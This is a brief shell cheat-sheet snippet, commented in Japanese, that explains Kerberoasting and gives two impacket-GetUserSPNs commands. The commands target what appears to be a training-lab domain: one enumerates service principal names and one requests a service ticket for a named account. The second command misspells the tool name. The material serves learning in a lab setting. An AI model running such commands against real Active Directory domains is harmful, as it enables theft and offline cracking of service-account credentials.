```sh
# ケルベロースト
# ドメインコントローラからサービスチケットを要求する場合はサービスプリンシパル名（SPN）によってホストされるサービスにアクセスするための権限がユーザに付与されているかどうかを確認するチェックが実行されないため、ターゲットのSPNがわかっていればドメインコントローラからSPNのサービスチケットを要求できる
impacket-GetUserSPNs -dc-ip 10.10.10.10 spookysec.local/thm:"Password\!"

impakcet-GetUserSPNs -dc-ip 10.10.10.10 spookysec.local/thm:"Password\!" -request-user svc-user
```